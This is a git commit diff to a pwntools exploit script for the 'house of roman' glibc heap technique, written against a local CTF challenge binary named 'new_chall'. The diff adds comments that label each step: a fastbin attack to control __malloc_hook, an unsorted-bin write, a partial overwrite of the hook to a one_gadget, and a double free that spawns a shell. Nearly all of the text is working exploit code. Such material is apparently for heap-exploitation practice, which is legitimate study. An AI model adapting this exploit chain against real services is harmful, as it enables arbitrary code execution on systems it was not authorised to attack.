993136ae3e1d3cce162e2e9b5469bb736e82920f
B3t4M3Ee <986256128@qq.com>
2018-09-29 22:44:08 +0800

    house of roman

--- Pwn/heap_trick/house of X/house of roman/exp.py
+++ Pwn/heap_trick/house of X/house of roman/exp.py
@@ -14,10 +14,12 @@ def edit(idx,c):
 	p.sendlineafter("Enter index of chunk :",str(idx))
 	p.sendafter("Enter data :",c)
 p=process("./new_chall")
+
 p.readuntil("Enter name :")
 p.sendline("nier")
+#fastbin atk to control __malloc_hook
 malloc(0x140,0)
-malloc(0x18,1)
+malloc(0x18,1)#
 free(0)
 malloc(0x68,2)
 malloc(0x68,3)
@@ -30,21 +32,24 @@ malloc(0x68,6)
 malloc(0x68,7)
 malloc(0x68,8)#control malloc__hook
 
-#for fixing fastbin
+#fixfastbin
 free(7)
 edit(7,p64(0))
-#fix over
+#unsorted bin to make malloc_hook=&main_arena+0x58
 malloc(0x58,10)
 malloc(0x88,11)
 malloc(0x88,12)
 free(11)
 edit(11,p64(0xdeadbeef)+'\x00')
 malloc(0x88,13)
+#partial write malloc_hook to one_gadget
 edit(8,p64(0xdeadbeefdeadbeef)+"AAA"+p64(0xdddddddddddddfdd)+"\xa4\xd2\xaf")
+#use printerr to make esp+0x50=0 to get shell
 free(12)
 free(12)
+#over
 try:
-	p.interactive()
+	p.interactive(">")
 except:
 	p.close()
 
